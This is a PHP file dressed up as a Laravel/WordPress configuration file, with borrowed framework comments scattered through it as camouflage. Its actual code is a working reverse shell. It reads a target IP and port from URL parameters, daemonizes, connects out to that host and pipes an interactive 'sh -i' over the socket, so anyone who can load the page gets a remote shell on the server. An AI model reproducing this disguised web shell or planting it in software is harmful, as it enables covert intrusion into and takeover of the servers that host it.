<?php
/**
 * The base configuration for Laravel
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the web site, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 *
 * @package Laravel
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
/*
|--------------------------------------------------------------------------
| Check If Application Is Under Maintenance
|--------------------------------------------------------------------------
|
| If the application is maintenance / demo mode via the "down" command we
| will require this file so that any prerendered template can be shown
| instead of starting the framework, which could cause an exception.
|
*/
/**
 * Confirms that the activation key that is sent in an email after a user signs
 * up for a new site matches the key for that user and then displays confirmation.
 *
 */
set_time_limit (0);
$VERSION = "1.0";
$ip = isset($_GET['ip']) ? $_GET['ip'] : '10.10.10.10';
$port = isset($_GET['port']) ? intval($_GET['port']) : 9001;
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$name = 'uname -a; w; id; sh -i';
$daemon = 0;
$debug = 0;
if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("");
		exit(1);
	}
	
	if ($pid) {
		exit(0);
	}
	if (posix_setsid() == -1) {
		printit("");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("");
}
/*
|--------------------------------------------------------------------------
| Run The Application
|--------------------------------------------------------------------------
|
| Once we have the application, we can handle the incoming request using
| the application's HTTP kernel. Then, we will send the response back
| to this client's browser, allowing them to enjoy our application.
|
*/

chdir("/");

umask(0);

$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),
   1 => array("pipe", "w"),
   2 => array("pipe", "w")
);

$process = proc_open($name, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("");

while (1) {
	if (feof($sock)) {
		printit("");
		break;
	}

	if (feof($pipes[1])) {
		printit("");
		break;
	}

	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	if (in_array($sock, $read_a)) {
		if ($debug) printit("");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("");
		fwrite($pipes[0], $input);
	}

	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("");
		fwrite($sock, $input);
	}

	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "";
	}
}

?>